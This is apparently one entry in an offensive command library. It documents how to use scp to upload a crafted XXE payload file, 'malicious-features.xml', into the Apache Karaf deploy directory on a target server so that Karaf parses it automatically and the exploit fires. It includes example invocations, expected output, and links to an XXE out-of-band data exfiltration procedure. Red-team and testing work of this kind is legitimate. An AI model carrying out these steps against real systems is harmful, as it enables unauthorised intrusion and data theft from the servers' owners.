---
id: bacabfbf-8ea3-4146-b840-5d122c96d94a
name: scp-deploy-xml-to-karaf
type: command
executor: bash
data: 'scp malicious-features.xml $_KARAF_USER@$_TARGET_IP:/opt/apache-karaf/deploy/'
output: null
created_at: '2023-04-06T03:56:44.442606+00:00'
updated_at: '2023-04-10T20:24:44.655630+00:00'
platforms:
  - Linux
tags:
  - deployment
  - xxe
verified: true
validated: true
---

# scp-deploy-xml-to-karaf

## Command

```bash
scp malicious-features.xml $_KARAF_USER@$_TARGET_IP:/opt/apache-karaf/deploy/
```

## Description

This command uploads the crafted XXE XML payload to the Apache Karaf deploy directory on the target server using SCP over SSH. It positions the file for automatic parsing and exploitation during Karaf's deployment process.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `malicious-features.xml` | Local path to the XXE payload file | Yes |
| $_KARAF_USER | Username with write access to Karaf deploy dir | Yes |
| $_TARGET_IP | IP address of the Karaf server | Yes |
| `/opt/apache-karaf/deploy/` | Target deploy directory (adjust if custom install) | Yes |

## Examples

### Basic Usage

```bash
scp malicious-features.xml karaf_user@192.168.1.100:/opt/apache-karaf/deploy/
malicious-features.xml 100% 512     1.0KB/s   00:00
```

### Advanced Usage (With Port)

```bash
scp -P 2222 malicious-features.xml karaf_user@192.168.1.100:/opt/apache-karaf/deploy/
```

## Expected Output

Transfer progress and confirmation:

```
malicious-features.xml                               100%  512     1.0KB/s   00:00
```

Success: File uploaded without errors. Verify remotely via SSH: ls /opt/apache-karaf/deploy/malicious-features.xml. Failure: Permission denied (check credentials) or connection refused (check SSH).

## Related

- [[procedures/Apache-Karaf-XXE-Out-of-Band-Data-Exfiltration]]
- [[commands/create-karaf-xxe-xml-payload]]
